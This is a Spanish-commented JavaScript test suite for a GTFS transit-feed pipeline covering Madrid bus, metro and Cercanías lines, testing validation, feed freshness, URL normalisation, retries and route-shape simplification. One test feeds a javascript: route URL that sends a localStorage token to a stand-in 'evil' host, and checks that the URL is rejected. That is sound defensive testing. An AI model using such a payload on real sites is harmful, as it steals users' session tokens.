    expect(errors.some((e) => e.includes('FANTOMA'))).toBe(false);
    expect(errors.some((e) => e.includes('metro'))).toBe(true); // 1 línea de metro < mínimo 12 (red activa)
  });

  it('la validación exige mínimos solo de las redes activas (feed metro stale excluido no bloquea)', () => {
    const art = buildMLFixture(); // sin feed metro (como hoy con el M4 caducado)
    expect(art.counts.networks).not.toContain('metro');
    const errors = validateArtifacts(art);
    expect(errors.some((e) => e.includes('metro'))).toBe(false);
    expect(errors.some((e) => e.includes('interurban'))).toBe(true); // los mínimos del resto siguen aplicando
  });

  it('modo catálogo (feed stale): líneas/paradas/direcciones/shapes sin services/trips', () => {
    const munis = new Map([
      ['00001', 'Alcobendas'],
      ['00101', 'Aranjuez'],
      ['00002', 'Las Rozas'],
    ]);
    const art = buildArtifacts([FEED_A, FEED_B, FEED_ML, FEED_METRO], munis, {
      catalogNetworks: new Set(['metro']),
    });

    expect(art.counts.networks).not.toContain('metro');
    expect(art.counts.catalogNetworks).toEqual(['metro']);

    const doc = art.lineDocs.get('4__1_____');
    expect(doc.noSchedule).toEqual({ calendarEnd: '20271231', feedVersions: ['20260722'] });
    expect(doc.services).toBeUndefined();
    expect(doc.trips).toBeUndefined();
    expect(doc.directions.map((d) => d.id)).toEqual([0, 1]);
    expect(doc.directions.find((d) => d.id === 0).stops).toEqual(['4_100', '4_101']);

    const chip = art.lines.find((l) => l.routeId === '4__1_____');
    expect(chip.noSchedule).toBe(true);
    expect(art.lines.find((l) => l.routeId === '8__1___').noSchedule).toBeUndefined();

    // las estaciones de metro siguen en stops:all con sus líneas
    expect(art.stops.find((s) => s.code === '4_100').lines).toEqual(['1']);

    // shapes y heurística de selección intactas para el catálogo
    expect(art.shapeSelection.get('4__1_____').get(0).shapeId).toBe('SH_M1_A');
    const { docs: shapeDocs } = buildShapes(
      [FEED_A, FEED_B, FEED_ML, FEED_METRO],
      art.lineDocs,
      art.shapeSelection,
    );
    expect(shapeDocs.get('4__1_____').network).toBe('metro');

    // el mínimo MIN_ROUTES.metro no aplica a una red en catálogo
    expect(validateArtifacts(art).some((e) => e.includes('metro'))).toBe(false);
  });

  it('route_url solo pasa si es http(s): javascript: se descarta en origen', () => {
    const evil = {
      network: 'interurban',
      files: {
        ...FEED_A.files,
        'routes.txt': gtfs(
          'route_id,agency_id,route_short_name,route_long_name,route_desc,route_type,route_url\n' +
            '8__1___,CRTM,1,ALFA-BETA,,3,javascript:fetch("//evil/"+localStorage.getItem("t"))',
        ),
      },
    };
    const munis = new Map([
      ['00001', 'Alcobendas'],
      ['00101', 'Aranjuez'],
    ]);

    const art = buildArtifacts([evil, FEED_B], munis);
    expect(art.lines.find((l) => l.routeId === '8__1___').url).toBeNull();

    const ok = buildFixture();
    expect(ok.lines.find((l) => l.routeId === '8__1___').url).toBe('https://crtm.es/a');
  });

  it('route_url de crtm.es con .aspx (sitio antiguo, 404) se normaliza sin extensión', () => {
    expect(normalizeRouteUrl('https://www.crtm.es/9__6__005_.aspx')).toBe(
      'https://www.crtm.es/9__6__005_',
    );
    expect(normalizeRouteUrl('https://www.crtm.es/8__421___.aspx?lang=es')).toBe(
      'https://www.crtm.es/8__421___?lang=es',
    );
    expect(normalizeRouteUrl('https://crtm.es/a')).toBe('https://crtm.es/a'); // otras URLs intactas
    expect(normalizeRouteUrl('https://www.emtmadrid.es/x.aspx')).toBe(
      'https://www.emtmadrid.es/x.aspx',
    );
    expect(normalizeRouteUrl('javascript:alert(1)')).toBeNull();
    expect(normalizeRouteUrl('')).toBeNull();

    const oldPortal = {
      network: 'urban',
      files: {
        ...FEED_B.files,
        'routes.txt': gtfs(
          'route_id,agency_id,route_short_name,route_long_name,route_desc,route_type,route_url\n' +
            '9__1___,CRTM,1,CIRCULAR DELTA,,3,https://www.crtm.es/9__1__013_.aspx',
        ),
      },
    };
    const art = buildArtifacts(
      [FEED_A, oldPortal],
      new Map([
        ['00001', 'Alcobendas'],
        ['00101', 'Aranjuez'],
      ]),
    );
    expect(art.lines.find((l) => l.routeId === '9__1___').url).toBe(
      'https://www.crtm.es/9__1__013_',
    );
    expect(art.lineDocs.get('9__1___').url).toBe('https://www.crtm.es/9__1__013_');
  });

  it('routeId del feed con formato inválido (clave KV/R2 de producción) falla la validación', () => {
    const art = buildFixture();
    expect(validateArtifacts(art).some((e) => e.includes('routeId no válido'))).toBe(false);

    art.lineDocs.set('8__mal/id_' + 'x'.repeat(80), art.lineDocs.values().next().value);
    expect(validateArtifacts(art).some((e) => e.includes('routeId no válido'))).toBe(true);
  });

  it('validateShapes: colapso de geometrías vs generación anterior falla (anti purge masiva)', () => {
    const degraded = { stats: { routes: 1 }, docs: new Map() };
    expect(validateShapes(true, degraded, 455).some((e) => e.includes('80%'))).toBe(true);
    expect(validateShapes(true, degraded, 30).some((e) => e.includes('80%'))).toBe(false); // generación previa pequeña: suelo relativo inerte
    expect(validateShapes(true, { stats: { routes: 455 }, docs: new Map() }, 455)).toEqual([]);
    expect(validateShapes(true, degraded)).toEqual([]); // sin cuenta previa: solo el suelo de 0 geometrías aplica
  });

  it('validateArtifacts: frequencies con salidas expandibles sobre el máximo falla', () => {
    const art = buildMetroFixture();
    expect(validateArtifacts(art).some((e) => e.includes('salidas expandibles'))).toBe(false);

    art.counts.frequencies.departures = 200_001;
    expect(validateArtifacts(art).some((e) => e.includes('salidas expandibles'))).toBe(true);
  });

  it('shapes de metro: doc R2 con network metro y color', () => {
    const art = buildMetroFixture();
    const { docs } = buildShapes(art.__feeds, art.lineDocs, art.shapeSelection);
    const doc = docs.get('4__1_____');
    expect(doc).toBeDefined();
    expect(doc.network).toBe('metro');
    expect(doc.color).toBe('58ABE8');
    expect(doc.directions.map((d) => d.id)).toEqual([0, 1]);
  });
});

describe('withRetries (writes idempotentes contra la REST de Cloudflare)', () => {
  const transient = (status) => Object.assign(new Error(`HTTP ${status}`), { status });

  it('reintenta 5xx hasta tener éxito', async () => {
    let calls = 0;
    const value = await withRetries(() => {
      calls++;
      if (calls < 3) throw transient(500);
      return 'ok';
    }, 'test');
    expect(value).toBe('ok');
    expect(calls).toBe(3);
  });

  it('reintenta errores de red (TypeError de fetch)', async () => {
    let networkCalls = 0;
    const networkValue = await withRetries(() => {
      networkCalls++;
      if (networkCalls === 1) throw new TypeError('fetch failed');
      return 'ok2';
    }, 'test-red');
    expect(networkValue).toBe('ok2');
    expect(networkCalls).toBe(2);
  });

  it('agota los intentos si el error persiste', async () => {
    let exhausted = 0;
    await expect(
      withRetries(() => {
        exhausted++;
        throw transient(500);
      }, 'test-exhausted'),
    ).rejects.toThrow('HTTP 500');
    expect(exhausted).toBe(3);
  });

  it('no reintenta errores no transitorios (4xx)', async () => {
    let calls = 0;
    await expect(
      withRetries(() => {
        calls++;
        throw transient(403);
      }, 'test-403'),
    ).rejects.toThrow('HTTP 403');
    expect(calls).toBe(1);
  });
});

describe('Cercanías Renfe (NAP, núcleo 10T)', () => {
  it('cleanCercaniasLineName: padding de ancho fijo → "A - B" sin romper guiones internos', () => {
    expect(cleanCercaniasLineName('Principe Pio                            -Aeropuerto-T4')).toBe(
      'Principe Pio - Aeropuerto-T4',
    );
    expect(cleanCercaniasLineName('Aeropuerto-T4                           -Principe Pio')).toBe(
      'Aeropuerto-T4 - Principe Pio',
    );
    expect(cleanCercaniasLineName('Alcalá de Henares                       -')).toBe(
      'Alcalá de Henares -',
    );
    expect(cleanCercaniasLineName('  Chamartín   -   Clara Campoamor ')).toBe(
      'Chamartín - Clara Campoamor',
    );
  });

  it('normalizeCercaniasFiles: filtra el núcleo, agrupa por label y sintetiza routeId/direcciones', () => {
    const { files, stats } = normalizeCercaniasFiles(structuredCloneLikeFeed(FEED_CERCANIAS), {
      routeIdPrefix: '10T',
      version: '20260825_040012_RENFE_CERCA',
    });
    expect(stats).toEqual({
      routesRaw: 3,
      lines: 1,
      trips: 4,
      tripsWithoutTimes: 0,
      stopTimeRowsTotal: 10,
      stopTimeRowsKept: 9,
    });

    const routes = parseGtfsTable(files['routes.txt']);
    expect(routes).toHaveLength(1);
    expect(routes[0].route_id).toBe('10T_C1');
    expect(routes[0].route_short_name).toBe('C1');
    expect(routes[0].route_long_name).toBe('Principe Pio - Aeropuerto-T4');
    expect(routes[0].route_color).toBe('75B6E0');
    expect(routes[0].route_text_color).toBe('FFFFFF');

    // direcciones por terminales: T0=10200 (Pío, empate 2-2 → id menor), T1=10202 (T4)
    const trips = parseGtfsTable(files['trips.txt']);
    expect(trips.map((t) => [t.trip_id, t.direction_id])).toEqual([
      ['C1A', '1'],
      ['C1B', '1'],
      ['C1C', '0'],
      ['C1D', '0'],
    ]);
    expect(trips.every((t) => t.trip_headsign === '')).toBe(true);
    expect(trips.every((t) => t.shape_id === '10_C1')).toBe(true);

    // stop_times filtrado al núcleo (fuera la fila del 51T) y feed_info con la publicación NAP
    expect(parseGtfsTable(files['stop_times.txt'])).toHaveLength(9);
    expect(parseGtfsTable(files['feed_info.txt'])[0].feed_version).toBe(
      '20260825_040012_RENFE_CERCA',
    );
  });

  it('buildArtifacts: códigos r_*, dest por trip = última parada (cp1252), servicios de un día', () => {
    const art = buildCercaniasFixture();
    expect(art.counts.networks).toContain('cercanias');
    expect(art.counts.codeCollisions).toBe(0);

    const stops = art.stops.filter((s) => s.code.startsWith('r_'));
    expect(stops.map((s) => s.code).sort()).toEqual(['r_10200', 'r_10201', 'r_10202', 'r_10203']);
    expect(art.stops.some((s) => s.code === 'r_10299')).toBe(false); // otro núcleo, sin trips
    expect(stops.every((s) => s.zone === null)).toBe(true); // el feed no publica zone_id
    expect(stops.every((s) => s.lines.length === 1 && s.lines[0] === 'C1')).toBe(true);

    // municipio NN contra las paradas de bus: 3 pegadas a 00001 (Alcobendas), Alcalá lejos → null
    expect(art.stops.find((s) => s.code === 'r_10200').municipality).toBe('Alcobendas');
    expect(art.stops.find((s) => s.code === 'r_10203').municipality).toBeNull();

    const doc = art.lineDocs.get('10T_C1');
    expect(doc.network).toBe('cercanias');
    expect(doc.color).toBe('75B6E0');
    expect(doc.textColor).toBe('FFFFFF');
    expect(doc.url).toBeNull();
    expect(doc.municipality).toBe('Alcobendas');
    expect(doc.directions.map((d) => d.id)).toEqual([0, 1]);
    expect(doc.directions.find((d) => d.id === 1).stops).toEqual(['r_10200', 'r_10201', 'r_10202']);
    expect(doc.directions.find((d) => d.id === 0).stops).toEqual(['r_10202', 'r_10200']);

    // dest = última parada real del trip (decodificada de cp1252), prioridad absoluta read-side
    expect(doc.trips.map((t) => [t.dep, t.dest])).toEqual([
      [21600, 'Aeropuerto T4'],
      [28800, 'Príncipe Pío'],
      [32400, 'Príncipe Pío'],
      [90000, 'Aeropuerto T4'], // 25:00 del servicio del día (madrugada siguiente)
    ]);
    expect(doc.trips.every((t) => t.headsign === '')).toBe(true);

    // tid = trip_id GTFS original (join con el GTFS-RT de Renfe); orden = doc ordenado por dep
    expect(doc.trips.map((t) => t.tid)).toEqual(['C1A', 'C1C', 'C1D', 'C1B']);
    expect(art.counts.rt).toEqual({ tripsWithTid: 4 });
    // solo las redes con rtTripIds guardan tid: bus/ml/metro nunca
    for (const d of art.lineDocs.values()) {
      if (d.network !== 'cercanias') {
        expect((d.trips ?? []).every((t) => t.tid === undefined)).toBe(true);
      }
    }

    // calendar de Renfe: un service_id por fecha (ventana móvil)
    expect(doc.services).toHaveLength(2);
    expect(doc.services[0]).toMatchObject({
      days: [1, 0, 0, 0, 0, 0, 0],
      from: '20260825',
      to: '20260825',
    });
    expect(doc.trips.find((t) => t.dep === 90000).svc).toBe(1); // C1B → 1036X

    // el dest de cercanías no contamina destStats (alarma de deriva solo de bus)
    expect(art.counts.dest).toEqual({ conShortName: 0, conDest: 0, sinLabel: 0 });
    expect(art.counts.nnMuni).toEqual({ total: 7, resolved: 4 }); // ml 1/2 + cercanías 3/5 (10203 lejos y 10299 otro núcleo → null)
  });

  it('línea de una sola dirección (servicios ER unidireccionales): doc con 1 dirección', () => {
    const { files } = normalizeCercaniasFiles(structuredCloneLikeFeed(FEED_CERCANIAS), {
      routeIdPrefix: '10T',
    });
    const ER = {
      network: 'cercanias',
      stopCodePrefix: 'r_',
      muniStrategy: 'nn',
      destFromTripTerminal: true,
      files: {
        ...files,
        'routes.txt': gtfs(
          'route_id,agency_id,route_short_name,route_long_name,route_desc,route_type,route_url,route_color,route_text_color\n10T_ER04,,ER04,Guadalajara -,,2,,,\n',
        ),
        'trips.txt': gtfs(
          'route_id,service_id,trip_id,trip_headsign,direction_id,shape_id\n' +
            '10T_ER04,1035M,E1,,0,\n' +
            '10T_ER04,1035M,E2,,0,\n',
        ),
        'stop_times.txt': gtfs(
          'trip_id,arrival_time,departure_time,stop_id,stop_sequence\n' +
            'E1,06:00:00,06:00:00,10200,1\n' +
            'E1,07:00:00,07:00:00,10203,2\n' +
            'E2,06:30:00,06:30:00,10201,1\n' +
            'E2,07:30:00,07:30:00,10203,2\n',
        ),
        'shapes.txt': null,
      },
    };
    const art = buildArtifacts([ER], new Map());
    const doc = art.lineDocs.get('10T_ER04');
    expect(doc.directions).toHaveLength(1);
    expect(doc.directions[0].id).toBe(0);
    expect(doc.trips.every((t) => t.dest === 'Alcalá de Henares')).toBe(true);
    expect(doc.trips.every((t) => t.tid === undefined)).toBe(true); // feed sin rtTripIds: sin tid
    expect(art.counts.rt).toEqual({ tripsWithTid: 0 });
  });

  it('gate de frescura con margen por feed: ventana móvil de 30 d NO es stale con margen 15', () => {
    const cal = (end) => ({
      'calendar.txt': gtfs(
        `service_id,monday,tuesday,wednesday,thursday,friday,saturday,sunday,start_date,end_date\nS,1,1,1,1,1,1,1,20260101,${end}`,
      ),
      'calendar_dates.txt': null,
    });
    expect(feedIsStale(cal('20260914'), '20260830', 15)).toBe(false); // hoy+15 exacto
    expect(feedIsStale(cal('20260913'), '20260830', 15)).toBe(true);
    expect(feedIsStale(cal('20260923'), '20260830')).toBe(true); // con el margen estándar de 30 sería falso stale
  });

  it('MIN_ROUTES.cercanias aplica a la red activa y no bloquea cuando no está en la run', () => {
    const art = buildCercaniasFixture(); // 1 línea cercanías < mínimo 10
    expect(validateArtifacts(art).some((e) => e.includes('cercanias'))).toBe(true);

    const without = buildMLFixture(); // sin feed cercanías
    expect(validateArtifacts(without).some((e) => e.includes('cercanias'))).toBe(false);
  });

  it('shapes de cercanías: doc R2 con network/color y headsign mode(dest)', () => {
    const art = buildCercaniasFixture();
    expect(art.shapeSelection.get('10T_C1').get(0).shapeId).toBe('10_C1');
    expect(art.shapeSelection.get('10T_C1').get(1).shapeId).toBe('10_C1');

    const { docs } = buildShapes(art.__feeds, art.lineDocs, art.shapeSelection);
    const doc = docs.get('10T_C1');
    expect(doc.network).toBe('cercanias');
    expect(doc.color).toBe('75B6E0');
    expect(doc.directions.map((d) => d.id)).toEqual([0, 1]);
    // headsign de dirección = mode(dest): dir0 Pío, dir1 T4
    expect(doc.directions.find((d) => d.id === 0).headsign).toBe('Príncipe Pío');
    expect(doc.directions.find((d) => d.id === 1).headsign).toBe('Aeropuerto T4');
  });
});

describe('normalizeColor', () => {
  it('normaliza a RRGGBB mayúsculas y rechaza inválidos', () => {
    expect(normalizeColor(' 8ebf42 ')).toBe('8EBF42');
    expect(normalizeColor('FFFFFF')).toBe('FFFFFF');
    expect(normalizeColor('ZZZ')).toBeNull();
    expect(normalizeColor('')).toBeNull();
    expect(normalizeColor(undefined)).toBeNull();
  });
});

describe('frescura por feed (gate de calendario)', () => {
  it('feedCalendarEnd = max(end_date de calendar, fechas de calendar_dates)', () => {
    expect(feedCalendarEnd(FEED_ML.files)).toBe('20271231');
    const onlyDates = {
      'calendar.txt': null,
      'calendar_dates.txt': gtfs('service_id,date,exception_type\nS,20270101,1\nS,20260101,2'),
    };
    expect(feedCalendarEnd(onlyDates)).toBe('20270101');
    expect(feedCalendarEnd({ 'calendar.txt': null, 'calendar_dates.txt': null })).toBeNull();
  });

  it('feedIsStale aplica el margen de 30 días', () => {
    const today = '20260823';
    const cal = (end) => ({
      'calendar.txt': gtfs(
        `service_id,monday,tuesday,wednesday,thursday,friday,saturday,sunday,start_date,end_date\nS,1,1,1,1,1,1,1,20260101,${end}`,
      ),
      'calendar_dates.txt': null,
    });
    expect(feedIsStale(cal('20260527'), today)).toBe(true); // caducado (caso M4 real)
    expect(feedIsStale(cal('20260921'), today)).toBe(true); // hoy+29 → dentro del margen
    expect(feedIsStale(cal('20260922'), today)).toBe(false); // hoy+30 exacto → vigente
    expect(feedIsStale({ 'calendar.txt': null, 'calendar_dates.txt': null }, today)).toBe(true);
  });

  it('ymdPlusDays cruza mes y año', () => {
    expect(ymdPlusDays('20260823', 30)).toBe('20260922');
    expect(ymdPlusDays('20261231', 1)).toBe('20270101');
    expect(ymdPlusDays('20280228', 1)).toBe('20280229'); // bisiesto
  });
});

describe('validateArtifacts', () => {
  it('rechaza feeds por debajo de los umbrales', () => {
    const errors = validateArtifacts(buildFixture());
    expect(errors.some((e) => e.includes('paradas'))).toBe(true);
    expect(errors.some((e) => e.includes('interurban'))).toBe(true);
  });
});

// ---------- Shapes ----------

function shapeFeedsFixture(withShapeB = true) {
  const shapesRows = [
    // secuencia deliberadamente desordenada en el fichero
    'SHAPE_A,40.00100,-3.00000,2',
    'SHAPE_A,40.00000,-3.00000,1',
    'SHAPE_A,40.00200,-3.00000,3',
    'SHAPE_A,40.00200,-3.00100,4',
    'SHAPE_A,40.00200,-3.00100,5', // duplicado tras redondeo → fuera
    'SHAPE_SHORT,40.10000,-3.10000,1',
    'SHAPE_SHORT,40.10100,-3.10000,2',
  ];
  if (withShapeB) {
    shapesRows.push(
      'SHAPE_B,40.00600,-3.00000,2',
      'SHAPE_B,40.00500,-3.00000,1',
      'SHAPE_B,40.01100,-3.00000,3', // salto de ~667 m respecto al punto 2 → parte nueva
      'SHAPE_B,40.01200,-3.00000,4',
    );
  }
  return [
    {
      network: 'interurban',
      files: {
        'stops.txt': gtfs(
          'stop_id,stop_code,stop_name,stop_desc,stop_lat,stop_lon,zone_id,location_type\n' +
            'par_8_00001,00001,ALPHA,,40.0,-3.0,,0\n' +
            'par_8_00002,00002,BETA,,40.001,-3.0,,0',
        ),
        'routes.txt': gtfs(
          'route_id,agency_id,route_short_name,route_long_name,route_desc,route_type,route_url\n' +
            '8__7___,CRTM,7,ALFA-BETA,,3,',
        ),
        'trips.txt': gtfs(
          'route_id,service_id,trip_id,trip_headsign,direction_id,shape_id\n' +
            '8__7___,S1,T-A,BETA,0,SHAPE_A\n' +
            '8__7___,S1,T-A-SHORT,BETA,0,SHAPE_SHORT\n' +
            '8__7___,S1,T-B,ALFA,1,SHAPE_B',
        ),
        'calendar.txt': gtfs(
          'service_id,monday,tuesday,wednesday,thursday,friday,saturday,sunday,start_date,end_date\n' +
            'S1,1,1,1,1,1,1,1,20260101,20261231',
        ),
        'calendar_dates.txt': null,
        'feed_info.txt': null,
        'stop_times.txt': gtfs(
          'trip_id,arrival_time,departure_time,stop_id,stop_sequence\n' +
            'T-A,06:00:00,06:00:00,par_8_00001,0\n' +
            'T-A,06:05:00,06:05:00,par_8_00002,1\n' +
            'T-A-SHORT,07:00:00,07:00:00,par_8_00001,0\n' +
            'T-B,08:00:00,08:00:00,par_8_00002,0\n' +
            'T-B,08:05:00,08:05:00,par_8_00001,1',
        ),
        'shapes.txt': gtfs(shapesRows.join('\n')),
      },
    },
  ];
}

function buildShapeFixture(withShapeB = true) {
  const feeds = shapeFeedsFixture(withShapeB);
  const art = buildArtifacts(feeds, new Map());
  art.__feeds = feeds;
  return art;
}

describe('parseShapePoints', () => {
  it('filtra por shape_id pedido, ordena por secuencia y dedupa duplicados', () => {
    const buf = gtfs(
      'shape_id,shape_pt_lat,shape_pt_lon,shape_pt_sequence\n' +
        'A,40.00100,-3.00000,2\n' +
        'A,40.00000,-3.00000,1\n' +
        'A,40.00000,-3.00000,0\n' + // secuencia 0 con las mismas coords que la 1 → fuera (mismo punto tras redondeo)
        'A,40.00200,-3.00000,3\n' +
        'B,40.10000,-3.10000,1',
    );
    const shapes = parseShapePoints(buf, new Set(['A']));
    expect(shapes.has('B')).toBe(false);
    expect(shapes.get('A')).toEqual([
      [-3.0, 40.0],
      [-3.0, 40.001],
      [-3.0, 40.002],
    ]);
  });

  it('descarta shapes con menos de 2 puntos', () => {
    const buf = gtfs('shape_id,shape_pt_lat,shape_pt_lon,shape_pt_sequence\nA,40.0,-3.0,1');
    expect(parseShapePoints(buf, new Set(['A'])).size).toBe(0);
  });
});

describe('simplifyPoints (Douglas-Peucker)', () => {
  it('elimina puntos colineales', () => {
    const points = [
      [-3.0, 40.0],
      [-3.0, 40.001],
      [-3.0, 40.002],
      [-3.0, 40.003],
    ];
    expect(simplifyPoints(points, 5)).toEqual([
      [-3.0, 40.0],
      [-3.0, 40.003],
    ]);
  });

  it('conserva el codo y suelta los alineados con cada tramo', () => {
    const points = [
      [-3.0, 40.0],
      [-3.0, 40.001],
      [-3.0, 40.002],
      [-3.01, 40.0021], // giro hacia el oeste
    ];
    expect(simplifyPoints(points, 5)).toEqual([
      [-3.0, 40.0],
      [-3.0, 40.002],
      [-3.01, 40.0021],
    ]);
  });

  it('deja pasar todo con tolerancia enorme y nada con tolerancia 0 estricta', () => {
    const points = [
      [-3.0, 40.0],
      [-3.0, 40.001],
      [-3.0, 40.002],
    ];
    expect(simplifyPoints(points, 100000)).toHaveLength(2);
    expect(simplifyPoints([[-3.0, 40.0]], 5)).toHaveLength(1);
  });
});

describe('splitShapeParts', () => {
  it('corta en saltos mayores del umbral y descarta tramos de un punto', () => {
    const points = [
      [-3.0, 40.0],
      [-3.0, 40.001],
      [-3.0, 40.007], // ~667 m del anterior
      [-3.0, 40.008],
    ];
    const parts = splitShapeParts(points, 500);
    expect(parts).toHaveLength(2);
    expect(parts[0]).toEqual([
      [-3.0, 40.0],
      [-3.0, 40.001],
    ]);
    expect(parts[1]).toEqual([
      [-3.0, 40.007],
      [-3.0, 40.008],
    ]);
  });

  it('un punto aislado tras el hueco no genera tramo', () => {
    const points = [
      [-3.0, 40.0],
      [-3.0, 40.001],
      [-3.0, 40.007], // ~667 m del anterior
    ];
    expect(splitShapeParts(points, 500)).toHaveLength(1);
  });

  it('mantiene un solo tramo sin huecos', () => {
    const points = [
      [-3.0, 40.0],
      [-3.0, 40.001],
      [-3.0, 40.003],
    ];
    expect(splitShapeParts(points, 500)).toHaveLength(1);
  });
});

describe('buildShapes', () => {
  it('selecciona el shape del trip con más paradas por dirección y construye el doc GeoJSON', () => {
    const art = buildShapeFixture();

    expect(art.shapeSelection.get('8__7___').get(0).shapeId).toBe('SHAPE_A'); // T-A (2 paradas) gana a T-A-SHORT (1)
    expect(art.shapeSelection.get('8__7___').get(1).shapeId).toBe('SHAPE_B');

    const { docs, stats } = buildShapes(art.__feeds, art.lineDocs, art.shapeSelection);
    expect(docs.size).toBe(1);
    const doc = docs.get('8__7___');
    expect(doc.label).toBe('7');
    expect(doc.network).toBe('interurban');
    expect(doc.toleranceM).toBe(1.5);

    expect(doc.directions.map((d) => d.id)).toEqual([0, 1]);
    const dir0 = doc.directions[0];
    expect(dir0.shapeId).toBe('SHAPE_A');
    expect(dir0.geometry.type).toBe('MultiLineString');
    expect(dir0.geometry.coordinates).toHaveLength(1); // sin huecos → un tramo
    expect(dir0.geometry.coordinates[0][0]).toEqual([-3.0, 40.0]);
    expect(dir0.distanceM).toBeGreaterThan(0);

    const dir1 = doc.directions[1];
    expect(dir1.shapeId).toBe('SHAPE_B');
    expect(dir1.geometry.coordinates).toHaveLength(2); // hueco de ~667 m → dos tramos

    expect(doc.bounds[0]).toBeCloseTo(-3.001, 5);
    expect(doc.bounds[2]).toBeCloseTo(-3.0, 5);
    expect(doc.bounds[1]).toBeCloseTo(40.0, 5);
    expect(doc.bounds[3]).toBeCloseTo(40.012, 5);

    expect(stats.routes).toBe(1);
    expect(stats.pointsOriginal).toBeGreaterThan(0);
    expect(stats.pointsSimplified).toBeLessThanOrEqual(stats.pointsOriginal);
    expect(stats.maxRouteId).toBe('8__7___');
  });

  it('una dirección sin shape en shapes.txt queda fuera del doc', () => {
    const art = buildShapeFixture(false); // sin SHAPE_B
    const { docs } = buildShapes(art.__feeds, art.lineDocs, art.shapeSelection);
    const doc = docs.get('8__7___');
    expect(doc.directions.map((d) => d.id)).toEqual([0]);
  });

  it('sube la tolerancia hasta caber en maxJsonBytes', () => {
    const art = buildShapeFixture();
    const { docs } = buildShapes(art.__feeds, art.lineDocs, art.shapeSelection, {
      maxJsonBytes: 400,
    });
    expect(docs.get('8__7___').toleranceM).toBe(48);
  });

  it('headsigns alineados con las directions del doc de KV', () => {
    const art = buildShapeFixture();
    const { docs } = buildShapes(art.__feeds, art.lineDocs, art.shapeSelection);
    const lineDoc = art.lineDocs.get('8__7___');
    expect(docs.get('8__7___').directions.map((d) => d.headsign)).toEqual(
      lineDoc.directions.map((d) => d.headsign),
    );
  });

  it('con dest por trip: headsign del doc R2 = mode(dest) por dirección (fallback GTFS sin dest)', () => {
    const feeds = shapeFeedsFixture();
    feeds[0].files['trips.txt'] = gtfs(
      'route_id,service_id,trip_id,trip_headsign,trip_short_name,direction_id,shape_id\n' +
        '8__7___,S1,T-A,BETA,7 BETA CENTRO,0,SHAPE_A\n' +
        '8__7___,S1,T-A-SHORT,BETA,7 BETA CENTRO,0,SHAPE_SHORT\n' +
        '8__7___,S1,T-B,ALFA,ls 7 ALFA (por Polígono),1,SHAPE_B',
    );
    const art = buildArtifacts(feeds, new Map());
    const lineDoc = art.lineDocs.get('8__7___');
    expect(lineDoc.directions.map((d) => d.headsign)).toEqual(['BETA', 'ALFA']); // GTFS intacto en el doc KV

    const { docs } = buildShapes(feeds, art.lineDocs, art.shapeSelection);
    expect(docs.get('8__7___').directions.map((d) => d.headsign)).toEqual([
      'BETA CENTRO',
      'ALFA (por Polígono)',
    ]);
  });
});

describe('validateShapes', () => {
  it('falla si hay shapes.txt pero 0 geometrías utilizables', () => {
    const errors = validateShapes(true, { docs: new Map(), stats: { routes: 0 } });
    expect(errors).toHaveLength(1);
  });

  it('no falla si el feed no trae shapes.txt', () => {
    expect(validateShapes(false, { docs: new Map(), stats: { routes: 0 } })).toHaveLength(0);
  });
});
